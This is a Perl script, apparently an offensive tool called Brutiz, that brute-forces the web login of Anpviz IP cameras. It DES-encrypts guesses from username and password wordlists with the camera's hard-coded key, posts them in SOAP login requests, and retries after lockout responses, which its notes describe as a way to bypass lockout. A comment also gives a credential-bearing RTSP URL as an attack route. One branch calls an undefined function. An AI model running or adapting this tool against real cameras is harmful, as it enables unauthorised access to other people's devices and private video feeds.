#!/usr/bin/env perl
#
# Author:   Aut0exec
# Version:  V0.1
# Date:     June 2, 2022
# Synopsis: Program to brute force Anpviz camera login
#
# To Do:
# 1) Allow brute forcing range of IP addresses
# 2) Implement faster brute forcing against rtsp stream?
#    ie. ffplay "rtsp://172.16.0.94/stream1?username=admin&password=123456"
# 
# Known issues:
# 1) Doesn't currently support known user and known password usage
#    ie. Brutiz.pl -l admin -p 123456 -t 172.16.0.96

use strict;
use warnings;
use Getopt::Long 'HelpMessage';
use Getopt::Long qw(:config no_ignore_case);
use Crypt::DES;
use HTTP::Request;
use LWP::UserAgent;

my $key = 'WebLogin'; # Static Key used by Anpviz
my $cipher = new Crypt::DES $key;
my $version = 'v0.1';
my $lockout_count = 0;
my $max_reached = 0;
my $header = ['X-Requested-With' => 'XMLHttpRequest', 'Content-type' => 'application/x-www-form-urlencoded' ];
my $xml_prefix = '<?xml version="1.0"?><soap:Envelope xmlns:soap="http://www.w3.org/2001/12/soap-envelope"><soap:Header>';
my $xml_postfix = '</soap:Header><soap:Body></soap:Body></soap:Envelope>';

GetOptions (
	't=s' => \my $TARGET,
	'T=s' => \my $TARGETLIST,
	'P=s'   => \my $PASSLIST,
	'p=s'   => \my $PASS,
	'L=s'   => \my $USERLIST,
	'l=s'   => \my $USER,
	'd=i'   => \my $delay,
	'help|h'  => sub { HelpMessage(0) }, 
	'version|v'  => sub { print ("Version: $version\n"); exit 0; },
) or HelpMessage(1);

die HelpMessage(2) if (( $PASS and $PASSLIST ) or ( $USER and $USERLIST ) or not $TARGET);

my $url = "http://${TARGET}/ipcLogin";

sub des_crypt {

	chomp (my $plaintext = shift);

	if ( 8 > length($plaintext)) 
	{ 
		$plaintext .= ("\x00" x (8 - length($plaintext)));
		return ($cipher->encrypt($plaintext));
	}
	else 
	{
		my $ciphertext = '';
		my $splits = (length($plaintext) / 8);
		for (my $i=0; $i < $splits; $i++)
		{
			my $string = substr($plaintext, ($i*8), 8);

			if ( 8 > length($string)) 
			{ $string .= ("\x00" x (8 - length($string))); }	

			$ciphertext .= ($cipher->encrypt($string));
		}
		return ($ciphertext);
	}
}

# Expects USER, PASS
sub send_data {

	my $xml_user = "<userid>" . unpack("H*", shift) . "</userid>";
	my $xml_pass = "<passwd>" . unpack("H*", shift) . "</passwd>";
	my $xml_data = "$xml_prefix" . "$xml_user" . "$xml_pass" . "$xml_postfix";
	
	if ( $delay ) { sleep ($delay); }
	my $request = HTTP::Request->new('POST', $url, $header, $xml_data);
	my $ua = LWP::UserAgent->new( agent => "Brutiz $version");
	my $result = $ua->request($request);
			
	while ( $result->decoded_content =~ /passwordLock/ )
	{
		pass_lock () unless $delay == 60;

		sleep ($delay);
		print ("Resending request that triggered lockout.\n");
		$result = $ua->request($request);
	}

	if ( $result->is_success and $result->decoded_content =~ /<SystemFunction>/ )
		{ return 1; }
	
	return 0;
}

sub pass_lock {
	
	if ( not $delay )
	{
		print ("Delay not set in command line. Defaulting to 60 second delay.\n");
		$delay=60;
		$max_reached=1;
	}
	else
	{
		if ( 60 > $delay )
		{
			warn ("Receiving password lock response. Delay: $delay - May be insufficient.\n");
			$delay = int(($delay + ($delay / 2)));
			if ( 60 < $delay and not $max_reached )
			{
				print ("Reached max timeout of 60\n");
				$delay = 60;
				$max_reached=1;
			}
			else
			{ print ("Incrementing delay to: $delay \n"); }
		}
	}
}

sub single_brute {

	my $crypt_user = '';
	my $crypt_pass = '';
	my $res = 0;
	
	if ( $USERLIST and -e -f -r $USERLIST )
	{ 
		open (FH, '<', $USERLIST) or die "Couldn't open file: $USERLIST"; 
		$crypt_pass = des_crypt("$PASS");
	}
	elsif ( $PASSLIST and -e -f -r $PASSLIST )
	{
		open (FH, '<', $PASSLIST) or die "Couldn't open file: $PASSLIST";
		$crypt_user = des_crypt("$USER");
	}
	else
		{ die "Couldn't open any wordlist file to use...\n";}

	while (<FH>)
	{
		my $crypt_guess = des_crypt($_);
		if ( $USER )
		{ 
			$res = send_data ($crypt_user, $crypt_guess); 
			if ( $res )
				{ print ("SUCCESS! \nUsername: $USER \nPassword: $_ \n"); last; }
		}
		else
		{
			$res = send_data ($crypt_guess, $crypt_pass);
			if ( $res )
				{ print ("SUCCESS! \nUsername: $_ \rPassword: $PASS \n"); last; }
		}
	}
	close(FH) || die "Error closing file!";
}

sub multi_brute {
	
	my $res = 0;
	
	if ( -e -f -r $USERLIST )
		{ open (USER_FH, '<', $USERLIST) or die "Couldn't open file: $USERLIST"; }
	if ( -e -f -r $PASSLIST )
		{ open (PASS_FH, '<', $PASSLIST) or die "Couldn't open file: $PASSLIST"; }
	if ( not -e -f -r $USERLIST or not -e -f -r $PASSLIST)
		{ die "Error opening wordlists.\n"; }
	
	while (<USER_FH>)
	{
		chomp (my $user = "$_");
			
		while (<PASS_FH>)
		{
			chomp (my $pass = "$_");
						
			$res = send_data (des_crypt("$user"), des_crypt("$pass"));
			
			if ( $res )
				{ print ("SUCCESS! \nUsername: $user \nPassword: $pass \n"); last; }
		}
		seek PASS_FH,0,0;
	}
	close(USER_FH) || warn "Couldn't close userlist: $USERLIST \n";
	close(PASS_FH) || warn "Couldn't close passlist: $PASSLIST \n";
}

########## MAIN #############

if ($USERLIST and $PASSLIST)
	{ multi_brute(); }
elsif ($USER and $PASS and $TARGETLIST)
	{ targetlist_spray(); }
else
	{ single_brute(); }

#### POD DATA #####
=head1 DESCRIPTION

 Brutiz is a custom tool for brute forcing ANPVIZ IP camera web login
 Tested against:
	IPC-D230W
	IPC-D250W-S   (Supports brute force protection)
	IPC-D250W-S E (Supports brute force protection)

=head1 SYNOPSIS

 Brutiz.pl [[-l USER | -L FILE] [-p PASS | -P FILE]] [-t TARGET] [-d NUM]

 -l USER        Try username USER or -L to load list from file
 -p PASS        Try password PASS or -P to load list from file
 -t URL         IP/Host for camera or -T to load list from file
 --delay,-d NUM Add NUM second(s) delay between attempts
 --version,-v   Print Version information
 --help,-h      Print this help

=head1 VERSION

 0.1

=head1 HISTORY

 Version 0.1
 Allow brute forcing of passwords
 Allow brute forcing of usernames
 Allow brute forcing of pass and users
 Implement mechanism for delaying requests to bypass lockout on some cameras

=cut
